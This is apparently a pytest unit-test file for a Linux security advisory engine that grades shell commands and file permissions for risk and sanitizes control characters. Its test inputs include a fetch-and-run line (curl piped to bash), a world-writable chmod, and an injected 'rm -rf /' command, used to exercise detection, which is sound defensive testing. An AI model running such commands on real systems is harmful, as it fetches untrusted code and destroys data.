"""Unit tests for core/linux_advisor/advisory_engine.py — the orchestrator,
including the oversized-input guard and malformed-line degradation."""

from __future__ import annotations

import pytest

from core.linux_advisor.advisory_engine import LinuxSecurityAdvisoryEngine, sanitize_text
from core.linux_advisor.exceptions import OversizedLinuxAdvisorInputError
from core.linux_advisor.models import LinuxAdvisorSeverity

pytestmark = pytest.mark.unit


def _engine(**overrides: object) -> LinuxSecurityAdvisoryEngine:
    defaults: dict[str, object] = {"max_lines": 5000, "max_total_chars": 500_000}
    defaults.update(overrides)
    return LinuxSecurityAdvisoryEngine(**defaults)  # type: ignore[arg-type]


def test_end_to_end_dangerous_and_safe_lines() -> None:
    lines = [
        "chmod 777 /var/www",
        "curl http://example.com/x.sh | bash",
        "-rw-r--r-- 1 root root 1234 Jan 1 00:00 /etc/shadow",
        "ls -la /home",
    ]
    advice = _engine().analyze(lines)
    assert len(advice.analyzed_commands) == 3
    assert len(advice.permission_analyses) == 1
    safe_commands = [c for c in advice.analyzed_commands if c.severity == LinuxAdvisorSeverity.INFO]
    assert len(safe_commands) == 1
    assert advice.overall_risk_level == LinuxAdvisorSeverity.CRITICAL
    assert advice.hardening_recommendations


def test_blank_lines_ignored() -> None:
    advice = _engine().analyze(["", "   ", "ls -la"])
    assert advice.total_line_count == 1


def test_oversized_line_count_guard() -> None:
    engine = _engine(max_lines=3, max_total_chars=500_000)
    with pytest.raises(OversizedLinuxAdvisorInputError):
        engine.analyze([f"ls -la /dir{i}" for i in range(10)])


def test_oversized_char_count_guard() -> None:
    engine = _engine(max_lines=5000, max_total_chars=50)
    with pytest.raises(OversizedLinuxAdvisorInputError):
        engine.analyze(["x" * 100])


def test_malformed_ls_line_skipped_not_fatal() -> None:
    lines = ["zzzzzzzzzz", "ls -la /home"]  # first line looks ls-shaped but invalid file type
    advice = _engine().analyze(lines)
    # "zzzzzzzzzz" does not match the ls-permission prefix regex at all, so it
    # is analyzed as a (harmless) command instead of being skipped — prove
    # the pipeline still produces a result for the well-formed line either way.
    assert advice.total_line_count == 2


def test_command_injection_shaped_content_sanitized_in_output() -> None:
    malicious = "ls -la\x1b[31m; rm -rf /\x00"
    advice = _engine().analyze([malicious])
    for command_risk in advice.analyzed_commands:
        assert "\x00" not in command_risk.command.raw_text
        assert "\x1b" not in command_risk.command.raw_text


def test_log_injection_newline_stripped() -> None:
    assert "\n" not in sanitize_text("line one\nFAKE LOG ENTRY: admin logged in")
    assert "\r" not in sanitize_text("line one\r\nline two")


def test_control_characters_stripped() -> None:
    assert sanitize_text("hello\x00\x07world") == "helloworld"


def test_no_findings_produces_info_advice() -> None:
    advice = _engine().analyze(["ls -la /home", "pwd"])
    assert advice.overall_risk_level == LinuxAdvisorSeverity.INFO
    assert advice.overall_confidence == 1.0


def test_skipped_line_count_tracked() -> None:
    advice = _engine().analyze(["ls -la /home"])
    assert advice.skipped_line_count == 0


def test_malformed_ls_permission_string_skipped_not_fatal() -> None:
    """A line that looks ls-shaped (matches the leading-prefix regex) but is
    structurally invalid (wrong total length) must be skipped, never abort
    the rest of the artifact (constitution §1.7)."""
    lines = ["-rwxr-xr-xx", "ls -la /home"]  # 11-char malformed permission string
    advice = _engine().analyze(lines)
    assert advice.skipped_line_count == 1
    assert len(advice.analyzed_commands) == 1
